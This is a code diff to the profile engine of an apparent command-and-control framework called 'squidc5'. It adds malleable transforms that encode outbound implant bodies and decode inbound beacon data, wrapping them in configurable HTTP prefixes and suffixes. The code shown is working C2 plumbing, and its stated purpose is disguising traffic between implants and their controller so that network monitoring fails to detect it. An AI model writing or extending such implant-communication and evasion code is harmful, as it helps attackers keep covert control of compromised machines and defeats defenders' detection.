@@ -264,13 +264,21 @@ class ProfileEngine:
             data: Any = raw
         else:
             if isinstance(raw, bytes):
-                text = raw.decode("utf-8", errors="replace").strip()
+                blob = raw
             else:
-                text = str(raw).strip()
+                blob = str(raw).encode("utf-8")
+            p = profile or self.active()
+            # Malleable transform decode (before JSON parse)
+            if p and p.channel == "http" and getattr(p.http, "transforms", None):
+                try:
+                    from squidc5.profiles.transforms import apply_decode
+
+                    blob = apply_decode(list(p.http.transforms or []), blob)
+                except Exception:
+                    pass
+            text = blob.decode("utf-8", errors="replace").strip()
             if not text:
                 return {}
-            # strip optional response-style prefix/suffix if client echoed
-            p = profile or self.active()
             if p and p.channel == "http":
                 pref = p.http.response_prefix or ""
                 suf = p.http.response_suffix or ""
@@ -313,7 +321,27 @@ class ProfileEngine:
         raw = json.dumps(obj, separators=(",", ":"))
         if not p or p.channel != "http":
             return raw
-        return f"{p.http.response_prefix or ''}{raw}{p.http.response_suffix or ''}"
+        body = f"{p.http.response_prefix or ''}{raw}{p.http.response_suffix or ''}"
+        if getattr(p.http, "transforms", None):
+            try:
+                from squidc5.profiles.transforms import apply_encode
+
+                return apply_encode(list(p.http.transforms or []), body.encode()).decode(
+                    "utf-8", errors="replace"
+                )
+            except Exception:
+                return body
+        return body
+
+    def encode_body(self, profile: C2Profile | None, obj: dict[str, Any]) -> bytes:
+        """Encode outbound implant body with profile transforms."""
+        p = profile or self.active()
+        raw = json.dumps(obj, separators=(",", ":")).encode()
+        if p and p.channel == "http" and getattr(p.http, "transforms", None):
+            from squidc5.profiles.transforms import apply_encode
+
+            return apply_encode(list(p.http.transforms or []), raw)
+        return raw
 
     def apply_body_template(self, profile: C2Profile | None, beacon_obj: dict[str, Any]) -> str:
         """Render request body for implant using profile template."""
